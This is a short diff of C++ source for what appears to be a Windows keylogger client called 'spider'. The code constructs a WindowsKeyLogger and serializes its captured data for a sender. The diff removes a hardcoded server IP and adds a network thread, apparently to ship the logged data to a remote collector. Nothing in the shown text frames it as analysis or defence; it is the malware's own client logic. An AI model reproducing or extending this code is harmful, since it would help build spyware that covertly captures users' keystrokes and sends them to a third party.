@@ -16,7 +16,7 @@
 #include "ClientCore.hpp"
 #include "Thread/BoostThread.hpp"
 
-spider::ClientCore::ClientCore() : _proto(new spider::ClientProtocol("10.26.112.233", PORT)),
+spider::ClientCore::ClientCore() : _proto(new spider::ClientProtocol()),
 				   _keylogger(new spider::WindowsKeyLogger())
 {}
 
@@ -28,6 +28,7 @@ void spider::ClientCore::run()
   MSG msg;
   bool running;
   std::unique_ptr<spider::IThread>	thread(boost::make_unique<BoostThread>());
+  std::unique_ptr<spider::IThread>	threadnet(boost::make_unique<BoostThread>());
 
   std::cout << "Before setting KeyLogger\n";
   running = true;
@@ -39,6 +40,11 @@ void spider::ClientCore::run()
   std::cout << "After setting KeyLogger\n";
   spider::BufferSender::BufferSenderInstance().push(spider::Serializer::getSerializer().get_string_from_ptree(spider::Serializer::getSerializer().serialize(*(_keylogger->getInfos()))));
   std::cout << "Push sender instance\n";
+  if (threadnet)
+  {
+    std::cout << "threadNet exist" << std::endl;
+    threadnet.get()->createNetThread();
+  }
   if (thread)
   {
     std::cout << "thread exists" << std::endl;
